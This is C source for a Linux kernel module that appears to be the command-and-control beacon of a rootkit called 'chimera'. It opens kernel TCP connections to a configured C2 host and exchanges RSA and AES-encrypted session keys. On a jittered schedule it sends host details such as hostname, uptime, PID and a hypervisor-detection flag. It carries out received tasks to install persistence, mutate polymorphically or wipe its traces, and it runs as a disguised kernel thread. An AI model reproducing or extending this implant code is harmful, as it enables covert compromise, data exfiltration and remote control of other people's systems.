#include "chimera.h"

struct socket *beacon_sock = NULL;

static int ksock_connect(struct socket **sock_out, __be32 addr, __be16 port)
{
    struct socket *sock;
    struct sockaddr_in saddr;
    int ret;

    ret = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret)
        return ret;

    memset(&saddr, 0, sizeof(saddr));
    saddr.sin_family      = AF_INET;
    saddr.sin_port        = port;
    saddr.sin_addr.s_addr = addr;

    ret = kernel_connect(sock, (struct sockaddr *)&saddr, sizeof(saddr), 0);
    if (ret) {
        sock_release(sock);
        return ret;
    }

    *sock_out = sock;
    return 0;
}

static int ksock_send(struct socket *sock, const void *buf, size_t len)
{
    struct msghdr msg = {0};
    struct kvec iov;
    int sent = 0, total = 0;

    while (total < len) {
        iov.iov_base = (void *)((__u8 *)buf + total);
        iov.iov_len  = len - total;

        sent = kernel_sendmsg(sock, &msg, &iov, 1, iov.iov_len);
        if (sent < 0)
            return sent;

        total += sent;
    }

    return total;
}

static int ksock_recv(struct socket *sock, void *buf, size_t len, int timeout_ms)
{
    struct msghdr msg = {0};
    struct kvec iov;
    long timeo;

    iov.iov_base = buf;
    iov.iov_len  = len;

    timeo = timeout_ms * HZ / 1000;
    if (timeo <= 0)
        timeo = 1;

    lock_sock(sock->sk);
    sock->sk->sk_rcvtimeo = timeo;
    release_sock(sock->sk);

    return kernel_recvmsg(sock, &msg, &iov, 1, len, 0);
}

static int c2_send_frame(struct socket *sock, __u16 type,
                         const __u8 *payload, size_t payload_len)
{
    struct c2_frame hdr;
    __u8 *enc_payload = NULL;
    int enc_len, ret;

    hdr.magic  = htonl(CHIMERA_MAGIC);
    hdr.seq    = htonl(g_state.seq_num++);
    hdr.type   = htons(type);
    hdr.length = 0;

    if (payload && payload_len > 0) {
        enc_payload = kzalloc(payload_len + AES_BLOCK_SIZE * 2, GFP_KERNEL);
        if (!enc_payload)
            return -ENOMEM;

        enc_len = aes256_encrypt(payload, enc_payload, payload_len);
        if (enc_len < 0) {
            kfree(enc_payload);
            return enc_len;
        }

        hdr.length = htons((__u16)enc_len);
    }

    ret = ksock_send(sock, &hdr, sizeof(hdr));
    if (ret < 0)
        goto out;

    if (enc_payload) {
        ret = ksock_send(sock, enc_payload, ntohs(hdr.length));
        if (ret < 0)
            goto out;
        ret = payload_len;
    } else {
        ret = 0;
    }

out:
    kfree(enc_payload);
    return ret;
}

static int c2_recv_frame(struct socket *sock, __u16 *type_out,
                         __u8 *payload_buf, size_t buf_size)
{
    struct c2_frame hdr;
    int ret;
    __u16 payload_len;

    ret = ksock_recv(sock, &hdr, sizeof(hdr), 5000);
    if (ret != sizeof(hdr))
        return -EAGAIN;

    if (ntohl(hdr.magic) != CHIMERA_MAGIC)
        return -EINVAL;

    *type_out = ntohs(hdr.type);
    payload_len = ntohs(hdr.length);

    if (payload_len == 0)
        return 0;

    if (payload_len > buf_size)
        return -EOVERFLOW;

    ret = ksock_recv(sock, payload_buf, payload_len, 5000);
    if (ret != payload_len)
        return -EAGAIN;

    ret = aes256_decrypt(payload_buf, payload_buf, payload_len);
    if (ret < 0)
        return ret;

    return ret;
}

static int do_key_exchange(struct socket *sock)
{
    __u8 rsa_out[RSA_KEY_SIZE];
    size_t rsa_out_len;
    int ret;

    get_random_bytes(g_state.session_key, AES_KEY_SIZE);
    get_random_bytes(g_state.aes_iv, AES_BLOCK_SIZE);

    ret = aes256_init(g_state.session_key, g_state.aes_iv);
    if (ret)
        return ret;

    ret = rsa_encrypt_session_key(g_state.session_key, rsa_out, &rsa_out_len);
    if (ret)
        return ret;

    ret = c2_send_frame(sock, 0xFF, rsa_out, rsa_out_len);
    if (ret < 0)
        return ret;

    __u16 resp_type;
    ret = c2_recv_frame(sock, &resp_type, NULL, 0);
    if (ret < 0)
        return ret;

    return 0;
}

static int build_heartbeat(__u8 *buf, size_t max_len)
{
    char hostname[65];
    __u32 uptime;
    int off = 0;

    memset(hostname, 0, sizeof(hostname));
    __kernel_gethostname(hostname, sizeof(hostname) - 1);

    uptime = jiffies_to_msecs(jiffies) / 1000;

    buf[off++] = 0x01;
    buf[off++] = strlen(hostname);
    memcpy(buf + off, hostname, strlen(hostname));
    off += strlen(hostname);

    buf[off++] = 0x02;
    buf[off++] = 4;
    memcpy(buf + off, &uptime, 4);
    off += 4;

    buf[off++] = 0x03;
    buf[off++] = 4;
    pid_t mypid = current->pid;
    memcpy(buf + off, &mypid, 4);
    off += 4;

    buf[off++] = 0x04;
    buf[off++] = 1;
    buf[off++] = g_state.hv.detected ? 1 : 0;
    off += 1;

    return off;
}

static int execute_task(__u16 type, const __u8 *payload, size_t len)
{
    switch (type) {
    case TASK_PERSIST:
        return rk_persist_install();

    case TASK_UPDATE:
        if (len >= AES_KEY_SIZE + 1) {
            memcpy(g_state.poly.xor_key, payload, AES_KEY_SIZE);
            g_state.poly.generation = payload[AES_KEY_SIZE];
            rk_polymorph_mutate(&g_state.poly);
        }
        return 0;

    case TASK_WIPE:
        memset(g_state.session_key, 0, AES_KEY_SIZE);
        rk_cleanup_hooks();
        rk_mem_guard_cleanup();
        g_state.running = 0;
        return 0;

    default:
        return -ENOSYS;
    }
}

static unsigned long jitter_sleep(unsigned long base_ms)
{
    __u32 jitter;
    long delta;

    get_random_bytes(&jitter, sizeof(jitter));
    jitter %= (unsigned int)(base_ms * BEACON_JITTER_PCT);

    delta = (long)jitter - (long)(base_ms * BEACON_JITTER_PCT / 2);

    if (delta < -(long)(base_ms / 2))
        delta = -(long)(base_ms / 2);
    if (delta > (long)base_ms)
        delta = (long)base_ms;

    return (unsigned long)((long)base_ms + delta);
}

static int beacon_thread_fn(void *data)
{
    __be32 c2_addr;
    __u8 tx_buf[1024], rx_buf[2048];
    __u16 resp_type;
    int ret;
    unsigned long sleep_ms;

    c2_addr = in_aton(C2_HOST);

    if (g_state.hv.detected)
        sleep_ms = BEACON_BASE_MS / 2;
    else
        sleep_ms = BEACON_BASE_MS;

    while (g_state.running) {
        unsigned long this_sleep = jitter_sleep(sleep_ms);
        schedule_timeout_interruptible(msecs_to_jiffies(this_sleep));

        if (!g_state.running)
            break;

        ret = ksock_connect(&beacon_sock, c2_addr, htons(C2_PORT));
        if (ret) {
            sleep_ms = min(sleep_ms * 2, 300000UL);
            continue;
        }

        if (g_state.seq_num == 0) {
            ret = do_key_exchange(beacon_sock);
            if (ret) {
                sock_release(beacon_sock);
                beacon_sock = NULL;
                continue;
            }
        }

        sleep_ms = g_state.hv.detected ?
                   BEACON_BASE_MS / 2 : BEACON_BASE_MS;

        int hb_len = build_heartbeat(tx_buf, sizeof(tx_buf));
        ret = c2_send_frame(beacon_sock, TASK_HEARTBEAT, tx_buf, hb_len);
        if (ret < 0) {
            sock_release(beacon_sock);
            beacon_sock = NULL;
            continue;
        }

        ret = c2_recv_frame(beacon_sock, &resp_type, rx_buf, sizeof(rx_buf));
        if (ret > 0) {
            execute_task(resp_type, rx_buf, ret);

            tx_buf[0] = 0x00;
            c2_send_frame(beacon_sock, resp_type | 0x80, tx_buf, 1);
        }

        sock_release(beacon_sock);
        beacon_sock = NULL;

        memset(tx_buf, 0, sizeof(tx_buf));
        memset(rx_buf, 0, sizeof(rx_buf));
    }

    return 0;
}

int rk_beacon_start(void)
{
    if (g_state.beacon_thread)
        return -EBUSY;

    g_state.running = 1;
    g_state.beacon_thread = kthread_run(beacon_thread_fn, NULL, "kchimera/%d",
                                        current->pid);

    if (IS_ERR(g_state.beacon_thread)) {
        g_state.beacon_thread = NULL;
        g_state.running = 0;
        return PTR_ERR(g_state.beacon_thread);
    }

    return 0;
}

void rk_beacon_stop(void)
{
    g_state.running = 0;

    if (beacon_sock) {
        sock_release(beacon_sock);
        beacon_sock = NULL;
    }

    if (g_state.beacon_thread) {
        kthread_stop(g_state.beacon_thread);
        g_state.beacon_thread = NULL;
    }
}
